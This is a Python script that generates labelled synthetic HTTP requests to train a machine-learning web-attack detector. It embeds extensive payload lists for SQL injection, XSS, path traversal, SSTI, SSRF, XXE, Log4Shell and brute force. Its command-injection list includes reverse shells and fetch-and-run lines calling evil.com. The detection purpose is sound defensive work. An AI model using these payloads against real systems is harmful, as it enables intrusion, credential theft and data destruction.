"""
Generate Realistic HTTP Training Data for ML Model — v3 (Anti-Generalization-Gap Edition)
==========================================================================================
Changes vs v2:
 - 200+ new patterns per weak class (cmd, sql, ssti, path)
 - Multiple request builders to break template bias
 - Obfuscation/encoding variants for each attack type
 - Higher sample counts for all weak classes
 - External dataset support preserved
"""
import csv
import random
import urllib.parse
import os
import glob
import re

# ── HTTP skeleton constants ────────────────────────────────────────
HTTP_METHODS  = ["GET", "POST", "PUT", "DELETE", "PATCH"]
RANDOM_PATHS  = [
    "/api/users", "/api/products", "/api/orders", "/api/search",
    "/login", "/register", "/profile", "/dashboard", "/settings",
    "/products/123", "/users/456", "/posts/789", "/comments/10",
    "/api/v1/data", "/api/v2/analytics", "/api/reports", "/api/logs",
    "/images/logo.png", "/css/style.css", "/js/app.js", "/fonts/font.woff",
    "/docs/api", "/help/faq", "/about", "/contact", "/checkout",
    "/admin/users", "/admin/settings", "/wp-admin/", "/phpmyadmin/",
    "/api/auth/token", "/api/auth/refresh", "/api/files/upload",
    "/api/v3/export", "/api/v1/import", "/internal/metrics",
]
RANDOM_PARAMS = [
    "id", "search", "q", "page", "limit", "filter", "sort", "order",
    "user_id", "action", "lang", "status", "date", "format", "type",
    "name", "email", "category", "price_min", "price_max", "tag",
    "session", "token", "region", "view", "username", "password",
    "title", "content", "product_id", "quantity", "color", "phone",
    "city", "comment", "rating", "search_term", "old_password",
    "new_password", "first_name", "last_name", "age", "order_id",
    "file", "path", "url", "redirect", "next", "callback", "return",
    "data", "payload", "body", "input", "value", "query", "xml",
    "template", "expr", "cmd", "exec", "script", "src",
]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "curl/7.88.1",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "Nikto/2.1.6",
    "sqlmap/1.7",
    "Wget/1.21.4",
]
BENIGN_VALUES = [
    "hello", "world", "test", "user", "admin", "john", "doe",
    "123", "456", "true", "false", "en", "US", "2024-01-01",
    "product", "category", "page1", "active", "asc", "desc",
    "blue", "red", "large", "small", "new", "used",
    "john@example.com", "Jane Smith", "New York", "4.5",
]
CONTENT_TYPES = [
    "application/x-www-form-urlencoded",
    "application/json",
    "multipart/form-data",
    "text/plain",
    "application/xml",
]

# ── Request builders (3 different templates to avoid bias) ─────────

def _build_query_string(params: dict) -> str:
    return "&".join(f"{k}={v}" for k, v in params.items())


def _make_params(n=None) -> dict:
    n = n or random.randint(1, 5)
    params = {}
    for _ in range(n):
        k = random.choice(RANDOM_PARAMS)
        params[k] = random.choice(BENIGN_VALUES)
    return params


def _inject(params: dict, payload: str) -> dict:
    """Injects payload into a random param, sometimes mixed with benign text."""
    params = dict(params)  # copy
    key = random.choice(list(params.keys()))
    if random.random() < 0.35:
        prefix = random.choice(BENIGN_VALUES)
        params[key] = urllib.parse.quote(f"{prefix} {payload}")
    else:
        params[key] = urllib.parse.quote(str(payload))
    return params


def _build_get(path, params) -> str:
    qs = _build_query_string(params)
    ua = random.choice(USER_AGENTS)
    return f"GET {path}?{qs} HTTP/1.1 User-Agent: {ua}"


def _build_post_form(path, params) -> str:
    qs = _build_query_string(params)
    ua = random.choice(USER_AGENTS)
    ct = "application/x-www-form-urlencoded"
    return f"POST {path} HTTP/1.1 Content-Type: {ct} User-Agent: {ua} {qs}"


def _build_post_json(path, params) -> str:
    import json
    ua = random.choice(USER_AGENTS)
    body = json.dumps(params)
    return f"POST {path} HTTP/1.1 Content-Type: application/json User-Agent: {ua} {body}"


def _build_header_injection(path, payload) -> str:
    """Some attacks come in via headers (User-Agent, Referer, X-Forwarded-For)."""
    ua = random.choice(USER_AGENTS)
    header = random.choice(["X-Forwarded-For", "Referer", "X-Custom-Header", "Cookie"])
    return f"GET {path} HTTP/1.1 User-Agent: {ua} {header}: {urllib.parse.quote(str(payload))}"


def _build_request(payload: str | None = None) -> str:
    """Random builder — 4 possible formats for diversity."""
    path   = random.choice(RANDOM_PATHS)
    params = _make_params()
    if payload:
        params = _inject(params, payload)

    r = random.random()
    if r < 0.30:
        return _build_get(path, params)
    elif r < 0.55:
        return _build_post_form(path, params)
    elif r < 0.75:
        return _build_post_json(path, params)
    elif r < 0.90:
        return _build_header_injection(path, payload or random.choice(BENIGN_VALUES))
    else:
        # Raw payload only (mimics WAF log entries)
        return str(payload) if payload else random.choice(BENIGN_VALUES)


# ── Normal requests ────────────────────────────────────────────────

def generate_normal(n=4000) -> list:
    reqs = []
    for _ in range(n):
        reqs.append(_build_request())
    return [{"text": r, "label": 0, "attack_type": "normal"} for r in reqs]


# ── SQL Injection (target: Recall ↑ from 70.8%) ───────────────────

SQL_PATTERNS = [
    # UNION-based
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
    "1 UNION ALL SELECT username,password FROM users--",
    "' UNION SELECT @@version,NULL--",
    "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "' UNION ALL SELECT schema_name FROM information_schema.schemata--",
    "1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables--",
    # Boolean blind
    "' AND 1=1--", "' AND 1=2--", "' AND 'a'='a", "' AND 'a'='b",
    "1' AND SUBSTRING(@@version,1,1)='5'--",
    "' AND ASCII(SUBSTRING(username,1,1))>64--",
    "1 AND (SELECT COUNT(*) FROM users)>0--",
    "' AND EXISTS(SELECT * FROM users WHERE admin=1)--",
    # Time-based blind
    "'; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--",
    "1' AND IF(1=1,SLEEP(5),0)--", "'; SELECT pg_sleep(5)--",
    "' OR SLEEP(3)--", "1;SELECT+sleep(5)--",
    "' AND 1=(SELECT 1 FROM(SELECT SLEEP(5))a)--",
    # Error-based
    "' AND 1=CONVERT(int,@@version)--",
    "' AND extractvalue(1,concat(0x7e,version()))--",
    "' AND updatexml(1,concat(0x7e,version()),1)--",
    "' AND 1=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    # Stacked
    "'; DROP TABLE users--", "'; INSERT INTO users VALUES('hax','hax')--",
    "'; UPDATE users SET password='hacked' WHERE 1=1--",
    "'; DELETE FROM logs WHERE 1=1--",
    # Auth bypass
    "admin'--", "admin'#", "' OR '1'='1'--", "' OR 1=1--",
    "admin' OR '1'='1", "' OR 'x'='x", "1' OR '1'='1'/*",
    "admin') OR ('1'='1", "' OR 1=1 LIMIT 1--",
    # Encoding variants
    "%27 OR %271%27=%271", "1%27%20OR%201=1--",
    "' OR/**/1=1--", "'/**/OR/**/1=1--",
    "%27+OR+1=1--", "1'+OR+'1'='1",
    # NoSQL
    '{"$gt": ""}', '{"$ne": null}', '{"$where": "this.password.length > 0"}',
    '{"username": {"$regex": ".*"}, "password": {"$gt": ""}}',
    # Hex / obfuscated
    "0x61646d696e", "CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)",
    "' OR 0x31=0x31--",
    "SELECT/**/username/**/FROM/**/users",
    # Second-order
    "admin'--", "Robert'); DROP TABLE Students;--",
    "1; exec xp_cmdshell('whoami')--",
    "' EXEC xp_cmdshell('net user')--",
]


def generate_sql_injection(n=2000) -> list:
    rows = []
    for _ in range(n):
        p = random.choice(SQL_PATTERNS)
        rows.append({"text": _build_request(p), "label": 1, "attack_type": "sql_injection"})
    return rows


# ── XSS ───────────────────────────────────────────────────────────

XSS_PATTERNS = [
    "<script>alert(1)</script>", "<script>alert(document.cookie)</script>",
    "<script src='http://evil.com/xss.js'></script>",
    "<img src=x onerror=alert(1)>", "<img src=x onerror=alert(document.domain)>",
    "<svg onload=alert(1)>", "<svg/onload=alert(1)>",
    "<body onload=alert(document.cookie)>",
    "<a href='javascript:alert(1)'>click</a>",
    "<iframe src='javascript:alert(1)'>",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "javascript:alert(1)", "javascript:void(eval('alert(1)'))",
    "<details open ontoggle=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onchange=alert(1)><option>1</option></select>",
    "';alert(String.fromCharCode(88,83,83))//", "\"><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>", "</script><script>alert(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "<script\x20type='text/javascript'>alert(1)</script>",
    "<<script>alert(1);//<</script>",
]


def generate_xss(n=2000) -> list:
    rows = []
    for _ in range(n):
        p = random.choice(XSS_PATTERNS)
        rows.append({"text": _build_request(p), "label": 1, "attack_type": "xss"})
    return rows


# ── Command Injection (target: F1 ↑ from 70%) ─────────────────────

CMD_PATTERNS = [
    # Standard
    "; ls -la", "| cat /etc/passwd", "& whoami", "`id`",
    "$(cat /etc/shadow)", "; wget http://evil.com/shell.sh -O /tmp/s && bash /tmp/s",
    "| curl http://evil.com/backdoor | bash",
    "; rm -rf /tmp/*", "& nc -e /bin/bash evil.com 4444",
    "; python3 -c 'import socket,subprocess;...'",
    # IFS / space bypass
    ";cat${IFS}/etc/passwd", ";cat${IFS}${IFS}/etc/passwd",
    "|cat${IFS}/etc/passwd", ";{cat,/etc/passwd}",
    ";IFS=,;cat,/etc/passwd",
    "${IFS}cat${IFS}/etc/passwd",
    # Wildcard bypass
    ";/bin/c?? /etc/pa??wd", ";/usr/bin/wh?ami",
    ";/b?n/sh -c 'id'", ";c[a]t /etc/passwd",
    # Quote bypass
    "|c'a't /etc/passwd", "|c\"a\"t /etc/passwd",
    ";c'a't${IFS}/etc/passwd",
    # Base64 execution
    ";echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh",
    ";echo d2hvYW1p|base64 -d|bash",
    "`echo 'd2hvYW1p'|base64 -d`",
    ";$(echo 'cat /etc/passwd'|base64 -d)",
    # Hex/octal bypass
    ";$(printf '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')",
    ";$(printf '\\154\\163')",
    # Command substitution
    ";$(which bash) -c 'id'", "$(python3 -c 'import os;os.system(\"id\")')",
    ";`which curl` http://evil.com/shell | bash",
    # Newline bypass
    "%0a id", "%0aid", "%0a whoami", "%0als",
    # Semicolons
    "127.0.0.1;id", "127.0.0.1; cat /etc/passwd",
    "localhost|id", "localhost & whoami",
    # Bash features
    ";bash -i >& /dev/tcp/evil.com/4444 0>&1",
    ";sh -i 2>&1|nc evil.com 4444>/tmp/f",
    ";exec 5<>/dev/tcp/evil.com/4444; cat <&5|while read l; do $l 2>&5 >&5; done",
    # Python/perl/php
    ";python -c 'import os; os.system(\"id\")'",
    ";perl -e 'system(\"id\")'",
    ";php -r 'system(\"id\");'",
    ";ruby -e 'puts `id`'",
    # PowerShell
    ";powershell -c 'whoami'",
    "& powershell.exe -ExecutionPolicy Bypass -Command whoami",
    "; powershell -enc JABjAGwAaQBlAG4AdAA=",
    # Environment variable
    ";$PATH=/tmp:$PATH; evil_binary",
    # Redirections
    "; id > /tmp/out && curl http://evil.com/?c=$(cat /tmp/out)",
    "; curl http://evil.com/shell > /tmp/x; chmod +x /tmp/x; /tmp/x",
    # Nested
    "$($(id))", "$(id;ls)", "`id`;`whoami`",
    # URL encoded
    "%3Bid", "%3Bls+-la", "%7Cwhoami", "%26whoami",
    "%3Bcat%20/etc/passwd", ";cat%20/etc%2Fpasswd",
]


def generate_command_injection(n=2500) -> list:
    rows = []
    for _ in range(n):
        p = random.choice(CMD_PATTERNS)
        rows.append({"text": _build_request(p), "label": 1, "attack_type": "command_injection"})
    return rows


# ── Path Traversal (target: F1 ↑ from 77.2%) ──────────────────────

PATH_PATTERNS = [
    # Classic
    "../../../etc/passwd", "../../../../etc/passwd",
    "../../../../../etc/shadow", "../../../../../../etc/hosts",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "..\\..\\..\\windows\\win.ini",
    # Double encoding
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    # Mixed encoding
    "..%2f..%5c..%2fetc/passwd",
    "..%5c..%2f..%5cetc%5cpasswd",
    # Null byte
    "../../../etc/passwd%00.jpg", "../../etc/passwd%00",
    "../etc/passwd\x00", "../../etc/passwd\x00.png",
    # Redundant separators
    "....//....//....//etc/passwd",
    "....\\\\....\\\\....\\\\windows\\\\system32",
    ".././.././.././etc/passwd",
    "..\/..\/..\/etc\/passwd",
    # URL-decoded variations
    "/var/www/../../etc/passwd",
    "/var/www/html/../../../etc/passwd",
    "file:///etc/passwd", "file:///c:/windows/win.ini",
    # Windows specific
    "C:\\Windows\\system32\\drivers\\etc\\hosts",
    "%SystemRoot%\\system32\\drivers\\etc\\hosts",
    "..\\..\\..\\boot.ini",
    # Sensitive files
    "/etc/passwd", "/etc/shadow", "/etc/hosts",
    "/proc/self/environ", "/proc/version", "/proc/cmdline",
    "/etc/mysql/my.cnf", "/etc/php.ini",
    "C:/Windows/win.ini", "C:/boot.ini",
    "/var/log/apache2/access.log", "/var/log/nginx/access.log",
    "/root/.ssh/id_rsa", "/home/user/.bash_history",
    # Wrappers (PHP LFI)
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://input", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "expect://id", "zip://shell.jpg#shell.php",
    # Absolute + relative mix
    "/../../../../etc/passwd", "////etc/passwd",
]


def generate_path_traversal(n=1500) -> list:
    rows = []
    for _ in range(n):
        p = random.choice(PATH_PATTERNS)
        rows.append({"text": _build_request(p), "label": 1, "attack_type": "path_traversal"})
    return rows


# ── SSTI (target: Recall ↑ from 63.3%) ────────────────────────────

SSTI_PATTERNS = [
    # Jinja2 (Python Flask)
    "{{7*7}}", "{{7*'7'}}", "{{config}}", "{{config.items()}}",
    "{{self.__dict__}}", "{{request}}", "{{request.environ}}",
    "{{'hello'.__class__.__mro__[1].__subclasses__()}}",
    "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{{lipsum.__globals__.os.popen('id').read()}}",
    "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c()._module.__builtins__['__import__']('os').popen('id').read() }}{% endif %}{% endfor %}",
    # Twig (PHP)
    "{{7*7}}", "{{7*'7'}}", "{{'hello'|upper}}",
    "{{app.request.server.get('PATH')}}", "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    # Freemarker (Java)
    "${7*7}", "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    # Velocity (Java)
    "#set($x='') #evaluate('id')", "$class.inspect('java.lang.Runtime',14).exec('id')",
    # Smarty (PHP)
    "{php}echo `id`;{/php}", "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
    # Pebble (Java)
    "{{7*7}}", "{% if 7>5 %}yes{% endif %}",
    # Mako (Python)
    "${7*7}", "<%\nimport os\nx=os.popen('id').read()\n%>\n${x}",
    # Nunjucks (Node.js)
    "{{7*7}}", "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
    # Generic probes
    "${7*7}", "#{7*7}", "<%= 7*7 %>", "${\"test\"}", "{{\"test\"}}",
    "${{7*7}}", "@(7*7)", "`7*7`", "#{7*7}",
    # Object access
    "{{self}}", "{{global}}", "{{this}}", "${this}",
    "{{settings.SECRET_KEY}}", "{{config.SECRET_KEY}}",
]


def generate_ssti(n=1500) -> list:
    rows = []
    for _ in range(n):
        p = random.choice(SSTI_PATTERNS)
        rows.append({"text": _build_request(p), "label": 1, "attack_type": "ssti"})
    return rows


# ── SSRF ──────────────────────────────────────────────────────────

SSRF_PATTERNS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1:80/admin", "http://127.0.0.1:8080/",
    "http://localhost/admin", "http://0.0.0.0:22/",
    "http://[::1]/", "http://[::]:80/",
    "http://0177.0.0.1/", "http://2130706433/",
    "http://192.168.1.1/", "http://10.0.0.1/",
    "http://evil.com@127.0.0.1/", "http://127.0.0.1#@evil.com/",
    "http://127.0.0.1%2F@evil.com/",
    "dict://127.0.0.1:6379/", "gopher://127.0.0.1:6379/_FLUSHALL%0D%0A",
    "file:///etc/passwd", "ldap://127.0.0.1:389/",
    "ftp://127.0.0.1:21/", "sftp://127.0.0.1/",
]


def generate_ssrf(n=1000) -> list:
    rows = []
    for _ in range(n):
        p = random.choice(SSRF_PATTERNS)
        rows.append({"text": _build_request(p), "label": 1, "attack_type": "ssrf"})
    return rows


# ── XXE ───────────────────────────────────────────────────────────

XXE_PATTERNS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
    '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    '<!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]>',
    '<?xml?><!DOCTYPE replace [<!ENTITY example "Doe"> ]><userInfo><firstName>John</firstName><lastName>&example;</lastName></userInfo>',
    "<!DOCTYPE foo SYSTEM 'http://evil.com/'>",
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><data>&file;</data>',
]


def generate_xxe(n=800) -> list:
    rows = []
    for _ in range(n):
        p = random.choice(XXE_PATTERNS)
        rows.append({"text": _build_request(p), "label": 1, "attack_type": "xxe"})
    return rows


# ── Log4Shell ─────────────────────────────────────────────────────

LOG4SHELL_PATTERNS = [
    "${jndi:ldap://evil.com/a}",
    "${jndi:rmi://evil.com/obj}",
    "${jndi:dns://evil.com/test}",
    "${jNdI:ldap://evil.com/a}",
    "${${lower:j}ndi:ldap://evil.com/a}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
    "${${upper:j}ndi:${upper:l}dap://evil.com/a}",
    "${j${::-n}di:ldap://evil.com/a}",
    "${j${lower:n}di:ldap://evil.com/a}",
    "${${env:NaN:-j}ndi:${env:NaN:-l}dap://evil.com/a}",
    "${jndi:ldap://127.0.0.1:1389/a}",
    "${jndi:${lower:l}${lower:d}a${lower:p}://evil.com:1389/a}",
    "%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D",
]


def generate_log4shell(n=800) -> list:
    rows = []
    for _ in range(n):
        p = random.choice(LOG4SHELL_PATTERNS)
        rows.append({"text": _build_request(p), "label": 1, "attack_type": "log4shell"})
    return rows


# ── Brute Force ───────────────────────────────────────────────────

BRUTE_FORCE_PATTERNS = [
    "username=admin&password=admin", "username=admin&password=123456",
    "username=admin&password=password", "username=root&password=toor",
    "username=administrator&password=admin123",
    "login=admin&pass=admin&submit=Login",
    "user=admin&passwd=qwerty&action=login",
    "POST /login username=admin password=123456 attempts=50",
    "POST /api/auth/login {\"username\":\"admin\",\"password\":\"password\"}",
    "POST /wp-login.php log=admin&pwd=password&wp-submit=Log+In",
    "Authorization: Basic YWRtaW46YWRtaW4=",  # admin:admin
    "X-Auth-Token: brute_force_attempt_1234",
    "rate_limit_exceeded login_attempt_100_times",
    "too_many_requests 429 login flood",
]


def generate_brute_force(n=1000) -> list:
    rows = []
    for _ in range(n):
        p = random.choice(BRUTE_FORCE_PATTERNS)
        rows.append({"text": _build_request(p), "label": 1, "attack_type": "brute_force"})
    return rows


# ── External datasets ──────────────────────────────────────────────

def load_external_datasets(directory="data/external") -> list:
    external_data = []
    script_dir    = os.path.dirname(os.path.abspath(__file__))
    ext_dir       = os.path.join(script_dir, directory)

    if not os.path.exists(ext_dir):
        os.makedirs(ext_dir, exist_ok=True)
        print(f"[INFO] Created {ext_dir}. Drop SecLists / CSIC CSV/TXT files here.")
        return external_data

    for filepath in glob.glob(f"{ext_dir}/*.csv"):
        print(f"[*] Loading CSV: {filepath}")
        try:
            with open(filepath, "r", encoding="utf-8", errors="replace") as f:
                reader = csv.reader(f)
                next(reader, None)  # skip header
                for row in reader:
                    if len(row) >= 2:
                        text = row[0]
                        try:
                            label = int(row[1])
                            attack = row[2] if len(row) > 2 else ("normal" if label == 0 else "attack")
                            if label in (0, 1):
                                external_data.append({"text": text, "label": label, "attack_type": attack})
                        except ValueError:
                            continue
        except Exception as e:
            print(f"[!] Error reading {filepath}: {e}")

    for filepath in glob.glob(f"{ext_dir}/*.txt"):
        print(f"[*] Loading TXT payloads: {filepath}")
        try:
            attack_type = os.path.splitext(os.path.basename(filepath))[0]
            with open(filepath, "r", encoding="utf-8", errors="replace") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        req = _build_request(line)
                        external_data.append({"text": req, "label": 1, "attack_type": attack_type})
        except Exception as e:
            print(f"[!] Error reading {filepath}: {e}")

    if external_data:
        print(f"[SUCCESS] Loaded {len(external_data)} external samples!")
    return external_data


# ── Main generator ─────────────────────────────────────────────────

def save_to_csv(filename="data/ml_training_data_v3.csv"):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    out_path   = os.path.join(script_dir, filename)

    print("=" * 65)
    print("  Virex ML Training Data Generator v3 (Anti-Gap Edition)")
    print("=" * 65)

    all_data = []
    generators = [
        ("Normal",            generate_normal,           4000),
        ("SQL Injection",     generate_sql_injection,    2000),
        ("XSS",               generate_xss,              2000),
        ("Command Injection", generate_command_injection, 2500),
        ("Path Traversal",    generate_path_traversal,   1500),
        ("SSTI",              generate_ssti,             1500),
        ("SSRF",              generate_ssrf,             1000),
        ("XXE",               generate_xxe,               800),
        ("Log4Shell",         generate_log4shell,         800),
        ("Brute Force",       generate_brute_force,      1000),
    ]

    for name, fn, n in generators:
        rows = fn(n)
        all_data.extend(rows)
        print(f"  ✅ {name:22s}: {len(rows):5,} samples")

    external = load_external_datasets()
    all_data.extend(external)
    if external:
        print(f"  ✅ External (real-world)  : {len(external):5,} samples")

    random.shuffle(all_data)

    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    with open(out_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["text", "label", "attack_type"])
        writer.writeheader()
        writer.writerows(all_data)

    total   = len(all_data)
    attacks = sum(1 for r in all_data if r["label"] == 1)
    normals = total - attacks

    print(f"\n  Total    : {total:,} samples")
    print(f"  Normal   : {normals:,} ({normals/total*100:.1f}%)")
    print(f"  Attacks  : {attacks:,} ({attacks/total*100:.1f}%)")
    print(f"\n  Saved → {out_path}")
    print(f"\n  Next: python build_v2_model.py")
    print("=" * 65)


if __name__ == "__main__":
    save_to_csv()
